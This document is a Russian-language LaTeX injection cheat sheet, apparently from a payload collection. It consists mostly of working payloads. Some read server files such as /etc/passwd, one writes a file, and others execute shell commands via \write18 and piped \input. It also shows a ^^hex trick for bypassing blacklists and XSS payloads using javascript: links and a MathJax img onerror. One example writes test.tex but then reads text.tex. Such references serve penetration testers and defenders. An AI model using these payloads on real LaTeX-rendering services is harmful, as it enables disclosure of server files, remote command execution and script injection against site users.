**Внедрение в LaTeX (LaTeX Injection)**

LaTeX-инъекция — это тип атаки, при котором вредоносное содержимое внедряется в документы LaTeX. LaTeX широко используется для подготовки документов и настольного издательства, особенно в академической среде, для создания высококачественных научных и математических документов. Благодаря своим мощным скриптовым возможностям, LaTeX может быть использован злоумышленниками для выполнения произвольных команд, если не приняты надлежащие меры защиты.

**Манипуляция файлами**

**Чтение файла**

Злоумышленники могут читать содержимое конфиденциальных файлов на сервере.

**Чтение файла с интерпретацией содержащегося в нем LaTeX-кода:**

```latex
\input{/etc/passwd}
\include{somefile} % загружает .tex файл (somefile.tex)
```

**Чтение файла с одной строкой:**

```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

**Чтение файла с несколькими строками:**

```latex
\lstinputlisting{/etc/passwd}
```

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

**Чтение текстового файла без интерпретации содержимого:** (будет вставлено только сырое содержимое файла)

```latex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

Если точка внедрения находится после заголовка документа (и `\usepackage` не может быть использован), можно деактивировать некоторые управляющие символы, чтобы использовать `\input` для файлов, содержащих `$`, `#`, `_`, `&`, нулевые байты и т.д. (например, Perl-скрипты).

```latex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

**Обход черного списка с помощью Unicode-представления:** можно попытаться заменить символ его шестнадцатеричным значением в кодировке.

*   `^^41` представляет заглавную букву A
*   `^^7e` представляет тильду (~) (обратите внимание, что 'e' должна быть строчной)

```latex
\lstin^^70utlisting{/etc/passwd} % lstinputlisting с заменой 'p' на ^^70
```

**Запись файла**

**Запись файла с одной строкой:**

```latex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

**Выполнение команд**

Вывод команды будет перенаправлен в стандартный вывод (stdout), поэтому для его получения необходимо использовать временный файл.

```latex
\immediate\write18{id > output}
\input{output}
```

Если вы получаете ошибку LaTeX, рассмотрите возможность использования base64 для получения результата без "плохих" символов (или используйте `\verbatiminput`):

```latex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

Другие способы выполнения команд:

```latex
\input|ls|base64
\input{|"/bin/hostname"}
```

**Межсайтовый скриптинг (XSS)**

Примеры от @EdOverflow:

```latex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

**В MathJax:**

```latex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```
